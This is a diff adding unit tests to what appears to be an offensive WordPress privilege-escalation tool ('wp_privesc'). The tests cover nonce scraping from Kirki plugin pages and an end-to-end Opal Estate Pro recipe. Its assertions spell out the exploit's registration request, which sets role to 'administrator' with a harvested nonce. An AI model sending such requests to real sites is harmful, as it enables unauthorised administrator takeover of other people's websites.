@@ -136,6 +136,24 @@ def test_harvest_rest_nonce_absent_returns_empty():
     assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == ""
 
 
+def test_harvest_rest_nonce_matches_unquoted_js_object_key():
+    # Real-world example: Kirki's own hand-rolled JS (not wp_localize_script,
+    # so no guaranteed JSON quoting) emits a bare/unquoted object key.
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200,
+        text='window.wp_kirki = {ajaxUrl: "https://t/wp-admin/admin-ajax.php", '
+             'apiVersion: "v1", postId: "5", nonce: "00834e37cb", call_from: ""};')
+    assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == "00834e37cb"
+
+
+def test_harvest_rest_nonce_does_not_match_substring_identifier():
+    # "xnonce" contains "nonce" as a substring but isn't the key we want.
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200,
+        text='var x = {xnonce: "shouldnotmatch123"};')
+    assert wp_privesc._harvest_rest_nonce("https://t", http, {}) == ""
+
+
 # ── register-role with page-harvested nonce + extra fields (real PoCs need it) ─
 def test_harvest_input_nonce_from_hidden_field():
     http = MagicMock()
@@ -151,6 +169,28 @@ def test_harvest_input_nonce_value_before_name():
     http.get.return_value = MagicMock(status_code=200,
         text='<input value="zzz999" name="reg-nonce" />')
     assert wp_privesc._harvest_input_nonce("https://t", http, "https://t/r", "reg-nonce") == "zzz999"
+
+
+def test_opal_estate_registry_recipe_wires_end_to_end():
+    # Uses the REAL registry recipe (not a synthetic dict) to catch wiring bugs
+    # between wp_recipes' field names and what _register_role expects.
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200,
+        text='<input type="hidden" name="opalestate-register-nonce" value="realnonce1">')
+    http.post.return_value = MagicMock(status_code=200, text="ok")
+    r = wp_recipes.find_privesc("opal-estate-pro")[0]
+    out = wp_privesc.acquire_admin("https://t", http, r,
+              creds={"username": "svc_o", "email": "o@x.z", "password": "pw98765432"})
+    assert http.get.call_args[0][0] == "https://t/"
+    data = http.post.call_args.kwargs["data"]
+    assert data["action"] == "opalestate_register_form"
+    assert data["username"] == "svc_o" and data["email"] == "o@x.z"
+    assert data["password"] == "pw98765432" and data["password1"] == "pw98765432"
+    assert data["role"] == "administrator"
+    assert data["opalestate-register-nonce"] == "realnonce1"
+    assert data["confirmed_register"] == "on"
+    assert data["_wp_http_referer"] == "/" and data["ajax"] == "1"
+    assert out == {"username": "svc_o", "password": "pw98765432"}
 
 
 def test_register_role_harvests_nonce_and_sends_extra_and_confirm_fields():
